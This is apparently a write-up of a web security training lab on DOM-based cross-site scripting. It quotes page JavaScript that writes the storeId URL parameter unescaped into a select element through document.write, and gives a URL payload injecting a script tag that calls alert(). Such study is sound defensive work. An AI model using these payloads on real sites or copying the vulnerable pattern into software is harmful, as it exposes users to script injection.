# Lab: DOM XSS in document.write sink using source location.search inside a select element

 >This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

>To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 

Some js found on vulnerable page:

`var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');`

Looks like there is a `storeId` url param that we can use. I created the following url and `999` was displayed in the form:

`https://ac4d1fd71ffbf804c0862df7006100ad.web-security-academy.net/product?productId=2&storeId=999`


This means that we can inject elements into the DOM through the storeId url param...

Solved the lab with the following url: `https://ac4d1fd71ffbf804c0862df7006100ad.web-security-academy.net/product?productId=2&storeId=999<script>onload=alert()</script>`

